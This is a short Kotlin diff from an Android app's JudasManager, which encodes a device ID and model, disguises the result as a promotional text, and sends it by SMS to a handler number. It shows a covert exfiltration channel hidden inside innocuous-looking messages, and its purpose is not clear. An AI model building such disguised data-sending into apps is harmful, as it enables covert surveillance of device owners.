@@ -80,13 +80,11 @@ object JudasManager {
             val rawData = "JUDAS_ALERT|$deviceId|$model"
             
             val token = FidelCipher.encode(rawData)
-            val promos = FidelCipher.camouflage(ctx, token)
+            val promo = FidelCipher.camouflage(ctx, token)
             
             val smsManager = ctx.getSystemService(SmsManager::class.java)
-            promos.forEach { promo ->
-                val parts = smsManager.divideMessage(promo)
-                smsManager.sendMultipartTextMessage(handler, null, parts, null, null)
-            }
+            val parts = smsManager.divideMessage(promo)
+            smsManager.sendMultipartTextMessage(handler, null, parts, null, null)
 
             DebugLogger.log("JUDAS", "Camouflaged Alert Dispatched to $handler")
             
